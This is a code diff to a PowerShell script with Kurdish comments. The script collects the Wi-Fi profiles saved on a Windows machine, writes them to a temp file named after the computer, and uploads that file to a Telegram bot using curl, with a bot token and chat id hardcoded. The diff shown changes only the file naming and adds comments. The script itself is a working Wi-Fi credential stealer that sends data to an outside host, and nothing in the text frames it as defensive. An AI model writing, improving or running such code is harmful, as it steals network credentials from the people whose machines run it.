@@ -1,6 +1,11 @@
+# وەرگرتنی ناوی کۆمپیوتەر
+$compName = $env:COMPUTERNAME
 $token = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
 $id = "8597805144"
-$p = "$env:TEMP\w.txt"
+
+# دروستکردنی ناوی فایلەکە بەپێی ناوی کۆمپیوتەرەکە
+$fileName = "$($compName)_wifi.txt"
+$p = "$env:TEMP\$fileName"
 
 if (Test-Path $p) { rm $p -Force }
 
@@ -15,6 +20,7 @@ netsh wlan show profiles | Select-String ":(.+)$" | % {
 }
 
 if (Test-Path $p) {
+    # ناردنی فایلەکە بە ناوە نوێیەکەیەوە
     curl.exe -F "document=@$p" "https://api.telegram.org/bot$token/sendDocument?chat_id=$id"
     rm $p -Force
 }
